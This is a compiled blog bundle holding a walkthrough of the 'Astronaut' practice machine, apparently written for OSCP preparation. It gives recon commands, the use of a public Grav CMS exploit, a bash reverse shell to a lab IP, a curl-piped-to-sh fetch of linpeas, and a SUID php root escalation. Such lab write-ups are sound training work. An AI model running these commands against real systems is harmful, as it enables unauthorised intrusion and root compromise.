"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[145],{4765:function(e,n,t){t.d(n,{F:function(){return d},Z:function(){return g}});var a=t(7294),l=t(8733),i=t(795),s=t(8377),r=t(6799),c=t(8871);var o=e=>{let{post:n}=e;return null};const m=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var p=e=>{let{data:{post:n},children:t}=e;return(0,l.tZ)(s.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},n.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,n.date),n.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(r.Z,{tags:n.tags})),n.timeToRead&&" — ",n.timeToRead&&(0,l.tZ)("span",null,n.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:m.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},t),(0,l.tZ)(o,{post:n}))};const d=e=>{var n,t,a;let{data:{post:i}}=e;return(0,l.tZ)(c.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(n=i.banner)||void 0===n||null===(t=n.childImageSharp)||void 0===t||null===(a=t.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function g(e){let{...n}=e;return a.createElement(p,n)}},6799:function(e,n,t){var a=t(8733),l=t(7294),i=t(1883),s=t(3494),r=t(9706);n.Z=e=>{let{tags:n}=e;const{tagsPath:t,basePath:c}=(0,s.Z)();return(0,a.tZ)(l.Fragment,null,n.map(((e,n)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!n&&", ",(0,a.tZ)(i.Link,{sx:e=>{var n;return{...null===(n=e.styles)||void 0===n?void 0:n.a}},to:(0,r.Z)(`/${c}/${t}/${e.slug}`)},e.name)))))}},8871:function(e,n,t){var a=t(7294),l=t(1883),i=t(4232);n.Z=e=>{let{title:n="",description:t="",pathname:s="",image:r="",children:c=null,canonicalUrl:o=""}=e;const m=(0,i.Z)(),{siteTitle:p,siteTitleAlt:d,siteUrl:g,siteDescription:u,siteImage:h,author:b,siteLanguage:f}=m,A={title:n?`${n} | ${p}`:d,description:t||u,url:`${g}${s||""}`,image:`${g}${r||h}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:f}),a.createElement("title",null,A.title),a.createElement("meta",{name:"description",content:A.description}),a.createElement("meta",{name:"image",content:A.image}),a.createElement("meta",{property:"og:title",content:A.title}),a.createElement("meta",{property:"og:url",content:A.url}),a.createElement("meta",{property:"og:description",content:A.description}),a.createElement("meta",{property:"og:image",content:A.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:A.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:A.title}),a.createElement("meta",{name:"twitter:url",content:A.url}),a.createElement("meta",{name:"twitter:description",content:A.description}),a.createElement("meta",{name:"twitter:image",content:A.image}),a.createElement("meta",{name:"twitter:image:alt",content:A.description}),a.createElement("meta",{name:"twitter:creator",content:b}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),o?a.createElement("link",{rel:"canonical",href:o}):null,c)}},68:function(e,n,t){t.r(n),t.d(n,{Head:function(){return r.F},default:function(){return c}});var a=t(7294),l=t(1151);function i(e){const n=Object.assign({span:"span",h1:"h1",p:"p",code:"code",pre:"pre",h2:"h2",ul:"ul",li:"li",strong:"strong",h3:"h3",a:"a"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 906px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 24.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA/UlEQVR42jWL23aCMBBF+YDKnaBcUhIQlYBcatEldaldbV/6/99zmoTysNfM2TPHqMs37HkLFh+Qp0KzY0dURY96O0DIqRxPKu0U6q5cVQw673mHMpud8Zy+MfYT6HqHggqU8rkTI66nO+7XL0zvD2yzBiw5YBofuJ0/MdQX7dTt4/zEZbih/3dGEGxASIQkeUUcUwRkgyhKdVZQynRWfr1O4LoEnkdAwrnj+6F0gXSh/jF+f07Icw4hBEQtpAyRsUzvTdOg6zuklMKyHTDO4bgeTLmr2bZHRHEM07JhO47+MQLf1cG0ZmE7LlamjZeVJTE1c2H2ai6o29JZ+AM0v4lUupTPYQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/4b5bc8b28d8e9e8c44b98e130ff7bb49/c07c5/info.png"\n        srcset="/static/4b5bc8b28d8e9e8c44b98e130ff7bb49/5243c/info.png 240w,\n/static/4b5bc8b28d8e9e8c44b98e130ff7bb49/ab158/info.png 480w,\n/static/4b5bc8b28d8e9e8c44b98e130ff7bb49/c07c5/info.png 906w"\n        sizes="(max-width: 906px) 100vw, 906px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h1,null,"Recon"),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 902px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 29.166666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAABIklEQVR42nWQW0+DQBCF+Wu+NCZGrbSUOyy3Liy3glRCW6ppfDd99sceZ4kmPNSHL7s5M3vOzCp3i3ssHp7gxiliUSDKCngxh2o6hDvDmeFibXswvABJXkJUDbJyB1W3oVy/BtR1CMYLdIcTMaJo93DCLdyIw7mBFSQUSgNQeCxKbPMKvKxhuAGU72uK88DIIKFiNcHLBmnVUnqNSD6g9Hz3OmmCTsYFDD+C7oXYSMhI3leGB0U1PVrBR5gWqLoebCt+GwM0/YDx8knGFUwWT/of0nCOrK/IS7FpNSlkdTs9fjuekbfdtPLh44L+9I79cURJ3yD75Lq3kD6azaC8bGwsNQsmpUY0ZZAIsDiD1IMkg2b5eF6b1GNP2n+ouoPHpY4favYC1nNii7IAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info-comm"\n        title=""\n        src="/static/614e279ac5fad3e2e7d3aab5df37b82f/0dc17/info-comm.png"\n        srcset="/static/614e279ac5fad3e2e7d3aab5df37b82f/5243c/info-comm.png 240w,\n/static/614e279ac5fad3e2e7d3aab5df37b82f/ab158/info-comm.png 480w,\n/static/614e279ac5fad3e2e7d3aab5df37b82f/0dc17/info-comm.png 902w"\n        sizes="(max-width: 902px) 100vw, 902px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThis machine has a Linux OS and is rated intermediate by the community."),"\n",a.createElement(n.p,null,"Remember to make an entry for the IP in ",a.createElement(n.code,null,"/etc/hosts")," file. My entry looks like:"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"192.168.188.12  astronaut.offsec\n")),"\n",a.createElement(n.h2,null,"Nmap"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"nmap -p- --open -sC -sV astronaut.offsec\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-p-"),": Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"--open"),": Displays only open ports, indicating which services are active and accessible."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sC"),": Performs default script scanning, which runs a set of scripts to gather additional information about the target."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sV"),": Enables version detection, providing information about the versions of services running on open ports.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 32.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA9klEQVR42m2Q61KDQAxG+ybWUhkLLAsIe2G5FKTVOuP7P85nEhQd9UfmWy57cpKd9c9wYYEPF1TNAFV4hOGKsu6Rly10FeSdrjqkuUNBmSgrZ10GZNrR2SKKCxweNHYpfRynN8zLO2y7whs3oe2v8N0FgbKl7MdXarqgo+zHG45xKZC1tMAEyFbGzwSb5QJDh+kmAAZxsS2bsjHXE92JTxXuj/kG2oBswIZfFrU9y3g8Jo/Gecoa7CO11d0h+wPagLwTNgjDi3ROlMFjWoupof3uo5wASmy+S6/w/wwz7QWgivZzwU7G+plsmmRGmq3PRv7l/A38AJTcvY/knywUAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/a2a12a462c040c9369f3b3ff26273ef8/7d769/nmap.png"\n        srcset="/static/a2a12a462c040c9369f3b3ff26273ef8/5243c/nmap.png 240w,\n/static/a2a12a462c040c9369f3b3ff26273ef8/ab158/nmap.png 480w,\n/static/a2a12a462c040c9369f3b3ff26273ef8/7d769/nmap.png 960w,\n/static/a2a12a462c040c9369f3b3ff26273ef8/305cf/nmap.png 1324w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"The nmap scan discovered a volume with ",a.createElement(n.code,null,"grav-admin")," folder."),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Browsing to this folder in the browser ",a.createElement(n.code,null,"http://astronaut.offsec/grav-admin/")," shows a default installation page"),"\n"),"\n",a.createElement(n.h2,null,"Gobuster"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"gobuster dir -u astronaut.offsec/grav-admin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt \n")),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 44.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAABpklEQVR42l2SaXKrMBCEfZI8BMYxDpvA7JsQJI6d5P7H6bQQqaTej66RGDTq+UaHYXpHP96QZB3CpEbRKNT9jKqdofQHxvkDWbkgzBSiYsFzMkGcK7iXFm7QMO4KuD9JHKpm4eEFrp/gSYTI4wSVTFBKiabVWy7N+y3neBHEMd7+/VW8y+4Pev1EIjs45sdjBC9X8OoVXqXRqjuG6YZr+wbn0sONFESkIWLKrONl18r9TIcZHdJBEBZbdY9FRTrByXgg1yi7V1SNxgvbdUIWSF6Zv1lt6wd1h5CP7SLXT3GYl0+2pcmvgX9K4eYDHWoca+uwp8OCDsW5ttyMUzITl47RSuzftpbNQF7iyjKgQ0/28K4jjuVEhytqdlC2K5zTleBZNKj+iz8Xtdah0g9I48q4I3Q3n+BuDBd0hiEvTAsNJ6CbkDmyMrwE1+JnbZiGo3VoGPnnzE7Q4yTTEU4+k6NiqysZzgg5qKdgwL9ogRMbdkSQcBDpu+Up778M9fqFbnhDXipcTZvjHY3+QlxqFORY1jNkobaiMd/heXuHe8t/36KJfopvRncceuo4wNwAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="gobuster"\n        title=""\n        src="/static/8f3aec5fe3c33c16aa0909a63efdcdb7/7d769/gobuster.png"\n        srcset="/static/8f3aec5fe3c33c16aa0909a63efdcdb7/5243c/gobuster.png 240w,\n/static/8f3aec5fe3c33c16aa0909a63efdcdb7/ab158/gobuster.png 480w,\n/static/8f3aec5fe3c33c16aa0909a63efdcdb7/7d769/gobuster.png 960w,\n/static/8f3aec5fe3c33c16aa0909a63efdcdb7/87339/gobuster.png 1440w,\n/static/8f3aec5fe3c33c16aa0909a63efdcdb7/814a3/gobuster.png 1470w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThe gobuster scan found an admin panel at ",a.createElement(n.code,null,"/admin/")," and many other endpoints."),"\n",a.createElement(n.h2,null,"Searchsploit"),"\n",a.createElement(n.p,null,"As the website is built with grav, we can search for known exploits using searchsploit."),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"searchsploit grav\n")),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 40.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABYlAAAWJQFJUiTwAAABnklEQVR42k2S6ZKbMBCEeZKtxGCwOQ0YmVsgY87sutbJr7z/e3RaJFXZH10zkmY+tQ7Du3bwhYKftjiHN9jnFI573aN9vn7JKffvWOvkZXADXZ/87zklMGQzQjYPDNENddYiLxSKokfDOa2yVMiyBklSIQgEzgRoJUkJpVbIdoKUE6JLAcu5wPgVZlDdgjGXmLoZvRzRVnc81II7x7IeOFZoyh4ZIVGQwTZ95hU+tk+s4zsUey5ujO9mAOO34++Q/Ca5MOHRL5iGjXHGoLVD7zvMpQPvFMOxAoi0xHN7YZs/dgO+HcI8RjB+2BF6Ws95TH3cjm77fkVBV4KbCCHh8G5swo72BRabDgTGdLisL0zTExVPYXHtoIGr6aGhi7wacKMEoS2BOha8w7x64Fbe9wewnBjfrBBvBx9BXGFaXlDD+16rYTtw5k4a0PJxagJrOaORC1q1oaXDa1IjZLPrC0IF/DDfY8oHnLefGMYncjo8cjOTLg1BSCo65CxIowIe5fP7eGwMtfh6Onf+fY1dzM/8NhHNhHGJgDV6Tp/gD8YABnKANk2nAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="searchsploit"\n        title=""\n        src="/static/f5a7ea8a2ff32f92dc73509b6395578e/7d769/searchsploit.png"\n        srcset="/static/f5a7ea8a2ff32f92dc73509b6395578e/5243c/searchsploit.png 240w,\n/static/f5a7ea8a2ff32f92dc73509b6395578e/ab158/searchsploit.png 480w,\n/static/f5a7ea8a2ff32f92dc73509b6395578e/7d769/searchsploit.png 960w,\n/static/f5a7ea8a2ff32f92dc73509b6395578e/87339/searchsploit.png 1440w,\n/static/f5a7ea8a2ff32f92dc73509b6395578e/ba1ef/searchsploit.png 1852w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nI  like to look at python scripts first, so the first script I will look at is the Arbitrary YAML Write/Update script as that one is ",a.createElement(n.strong,null,"unauthenticated"),"."),"\n",a.createElement(n.h3,null,"Arbitrary YAML Write/Update"),"\n",a.createElement(n.p,null,"First, download the unauthenticated script by using ",a.createElement(n.code,null,"searchsploit -m php/webapps/49973.py")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"looking at the code, we can see that the target is set to a variable"),"\n",a.createElement(n.li,null,"change this target to ",a.createElement(n.code,null,"http://astronaut.offsec/grav-admin"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"this is because the URL ",a.createElement(n.code,null,"http://astronaut.offsec")," only has a directory named grav-admin, so we must specify that directory for the exploit"),"\n"),"\n"),"\n",a.createElement(n.li,null,"the script says to run the following command and replace the output with the base64 encoded value in the script\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 8.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAaUlEQVR42m3KWQ6DMBADUG6SyUzIwtIQUJsKqYL7X8pMI/HHx5Mt2V0tCXuJqDlgHqTJk+AVGbO3GIVgyTRM1Pw7mWfdOgRs0SF7aZbgsCfBmRwO9dP+DoKPqrp99bv1jOgYvSi28Jq3Cy6yOgO9ytBMAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="scriptChange"\n        title=""\n        src="/static/9d3ca2e0f2806af86d7c94dacbf7effe/7d769/scriptChange.png"\n        srcset="/static/9d3ca2e0f2806af86d7c94dacbf7effe/5243c/scriptChange.png 240w,\n/static/9d3ca2e0f2806af86d7c94dacbf7effe/ab158/scriptChange.png 480w,\n/static/9d3ca2e0f2806af86d7c94dacbf7effe/7d769/scriptChange.png 960w,\n/static/9d3ca2e0f2806af86d7c94dacbf7effe/87339/scriptChange.png 1440w,\n/static/9d3ca2e0f2806af86d7c94dacbf7effe/88b03/scriptChange.png 1920w,\n/static/9d3ca2e0f2806af86d7c94dacbf7effe/de442/scriptChange.png 2534w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"For the command, you will need to replace the IP and port to the listening host (Kali IP and Port)"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"I will be using the command ",a.createElement(n.code,null,"nc -lnvp 4444")," to start a listener on my kali host with IP ",a.createElement(n.code,null,"192.168.45.220")),"\n",a.createElement(n.li,null,"So, the command I will run is ",a.createElement(n.code,null,'echo -ne "bash -i >& /dev/tcp/192.168.45.220/4444 0>&1" | base64 -w0')),"\n",a.createElement(n.li,null,"then, replace the contents in the designated ",a.createElement(n.code,null,"base64_decode()")," function"),"\n"),"\n",a.createElement(n.p,null,"Start a netcat listener and run the script using ",a.createElement(n.code,null,"python3 49973.py")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"after a couple seconds, a shell is generated with the user\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 21.25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAxElEQVR42j1P7RKCMAzjUVQQPziGDGGAc4DioZ7v/zqx6Z3+yKXt1jSJjLuj9guMC+jCgqa7wZQ99lmNZFciPVQ45o3ydm+FrXCpYB2nJ6wT80cUhgW9nwUPeBEM4wvD9IaXOXvyNH9wHZ5oL7POruMTndSuv8OeAzLTorAeWe4QceHsRv3ID3U7KTftDZ0coWO6W8X5H3FaIhFnm22hDpmEjskRFyhI5rVT5UV01Bn7qg56pLAXVM2g74zOeBQkfnFZfwF8V4BWKf2BBwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="shell"\n        title=""\n        src="/static/428abc46fd57412b2ee6d6314c55b5bb/7d769/shell.png"\n        srcset="/static/428abc46fd57412b2ee6d6314c55b5bb/5243c/shell.png 240w,\n/static/428abc46fd57412b2ee6d6314c55b5bb/ab158/shell.png 480w,\n/static/428abc46fd57412b2ee6d6314c55b5bb/7d769/shell.png 960w,\n/static/428abc46fd57412b2ee6d6314c55b5bb/2810f/shell.png 1156w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.h1,null,"Privilege Escalation"),"\n",a.createElement(n.h2,null,"Manual commands"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"find / -type f -perm -4001 -exec ls -la {} \\; 2> /dev/null\n")),"\n",a.createElement(n.h3,null,"Explanation:"),"\n",a.createElement(n.p,null,a.createElement(n.code,null,"find / -type f -perm -4001"),":\nfind: Initiates the find command for searching files and directories.\n",a.createElement(n.code,null,"/"),": Specifies the starting directory for the search (root directory in this case).\n",a.createElement(n.code,null,"-type f"),": Specifies that only files (not directories) should be considered in the search.\n",a.createElement(n.code,null,"-perm -4001"),": Searches for files with the SUID bit set. The SUID bit, when set, allows a file to be executed with the permissions of its owner."),"\n",a.createElement(n.p,null,a.createElement(n.code,null,"-exec ls -la {} \\;"),":\n",a.createElement(n.code,null,"-exec"),": Executes a command for each matched file. The command is\n",a.createElement(n.code,null,"ls -la {}"),": Uses the ",a.createElement(n.code,null,"ls")," command to list information about the found files. The ",a.createElement(n.code,null,"-la")," option is used to make a list showing all files and details.\n",a.createElement(n.code,null,"{}"),": is replaced by the matched file for each iteration.\n",a.createElement(n.code,null,"\\;"),": Marks the end of the -exec command."),"\n",a.createElement(n.p,null,a.createElement(n.code,null,"2> /dev/null"),":\n",a.createElement(n.code,null,"2>"),": Redirects standard error (stderr) to a specified location.\n",a.createElement(n.code,null,"/dev/null"),": A special file in Unix-like operating systems that discards any data written to it."),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 81.25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAABYlAAAWJQFJUiTwAAACYklEQVR42n1Ua2/aQBD0L2kDgQDhjd/YnLGNHxQIaVqplfr/f8d0Z40tgtR+WN1x9s7NzoyxguiAXVIjjA+IdiV2+1rqiK3sw7iAF6ayLxCZCm6QwvYSbByDtb3DZOZi9OpgPHUxXfi6Wv42l5dLbFyDWJpiAc+LNxgBdaSZq0m/6dmhvCLNz/L7iOxwwWoT4+l5jt5goeuTrJbtGWGR6UNf1kAuIMutsFs7O2FdgVPwouwGxkn22Qns7Q3meH5ZoT9calmhvKxs/L2Oyn1ZvysrMkxkZXNRXVEdP5CXb8qOtRQSX/szZchSQNtNlCEfcvXDvNFPLiJD6sgiQwK37Kk7ScyWgfRGoqenoBZH5MsUO04qbSBDauV4eyQEkTHJrOD54Yx9flJNCcRxB6N1N7bFW+jwPRvqRINWdtwYJUV2qQBRErKjQZyIZrT6/RMwKy4ak5VEg6xpArWkbkYmaEGniwBfRMPWaQUMomZkR0euOzZscmmUnBGMI5dVI0X7m1pSe+ay09B2TWcKDeGewDSGrNnUJoH60n0+Y3b5/nwZYrmOMJaAKyDHTdImNmyKVZ8mGmqKAJClmiLRoSF8xilmAvY69zEcbzotNTYMNA1o2XBssuElZNEEu/n06CgBXia21khqKGedKfexIROyzIuLrhxZs3f7HDnNVBi1Qb4P9IPL/MyMNnBPkLD99IQt/xyYx9jUGAqj3h3AY1meAG5lpM3NgEgql/AyHo6yrvQsYw6lRpMN+g+sPgG+mwzfsxLH0OBDVu5/1Sf8PNQ4RQl+5JWe/67P+HO6wqxcDP4D+Bfv8Bdp8HprogAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="manual-enum"\n        title=""\n        src="/static/695e6a8262a36a2075989f200eb15a1b/7d769/manual-enum.png"\n        srcset="/static/695e6a8262a36a2075989f200eb15a1b/5243c/manual-enum.png 240w,\n/static/695e6a8262a36a2075989f200eb15a1b/ab158/manual-enum.png 480w,\n/static/695e6a8262a36a2075989f200eb15a1b/7d769/manual-enum.png 960w,\n/static/695e6a8262a36a2075989f200eb15a1b/357aa/manual-enum.png 1388w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h2,null,"Linpeas"),"\n",a.createElement(n.p,null,"To assess the attack surface further, run ",a.createElement(n.code,null,"linpeas.sh")," on the target:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"run a python http server in the directory with the ",a.createElement(n.code,null,"linpeas.sh")," file with ",a.createElement(n.code,null,"python3 -m http.server 80")),"\n",a.createElement(n.li,null,"then use the ",a.createElement(n.code,null,"curl")," command with ",a.createElement(n.code,null,"sh")," to run the script on the target machine"),"\n",a.createElement(n.li,null,"the IP specified is downloading from my Kali host"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"curl http://192.168.45.220/linpeas.sh | sh\n")),"\n",a.createElement(n.h3,null,"Linpeas Results"),"\n",a.createElement(n.p,null,"The linpeas results showed php7.4 binary file in the directory ",a.createElement(n.code,null,"/usr/bin/php7.4")," that has an unknown SUID binary. The output is shown below"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"-rwsr-xr-x 1 root root 4.6M Feb 23  2023 /usr/bin/php7.4 (Unknown SUID binary!)\n")),"\n",a.createElement(n.p,null,"We can confirm these findings with the manual enumeration commands we used. We did indeed find a php7.4 file."),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"Using this information we can try to find privilege escalation for SUID in ",a.createElement(n.a,{href:"https://gtfobins.github.io/gtfobins/php/"},"GTFOBins")),"\n"),"\n",a.createElement(n.p,null,"GTFOBins uses the following command"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n")),"\n",a.createElement(n.p,null,"In order for this command to fit our context, we would change the running script to"),"\n",a.createElement(n.pre,null,a.createElement(n.code,{className:"language-bash"},"/usr/bin/php7.4 -r \"pcntl_exec('/bin/sh', ['-p']);\"\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"the flag is located in the ",a.createElement(n.code,null,"/root")," folder"),"\n"),"\n",a.createElement(n.h1,null,"Summary"),"\n",a.createElement(n.p,null,'The "Astronaut" box in Proving Grounds Practice involves a comprehensive penetration testing approach.\nInitial reconnaissance using Nmap uncovers a Grav CMS installation with potential vulnerabilities.\nGobuster identifies an admin panel, while Searchsploit yields an unauthenticated YAML Write/Update script which needs to be adapted.\nManual enumeration reveals files with the SUID bit set, further explored with LinPEAS, confirming an unknown SUID binary, ',a.createElement(n.code,null,"/usr/bin/php7.4"),".\nExploiting this binary using GTFOBins facilitates privilege escalation, granting access to the /root folder where the flag is found.\nThis walkthrough provides practical insights into various stages of a penetration test, offering a valuable learning experience for OSCP preparation."),"\n",a.createElement(n.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(n.p,null,"+10 points"))}var s=function(e){void 0===e&&(e={});const{wrapper:n}=Object.assign({},(0,l.ah)(),e.components);return n?a.createElement(n,e,a.createElement(i,e)):i(e)},r=t(4765);function c(e){return a.createElement(r.Z,e,a.createElement(s,e))}r.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-astronaut-index-mdx-c1324741b8c6287cc2fd.js.map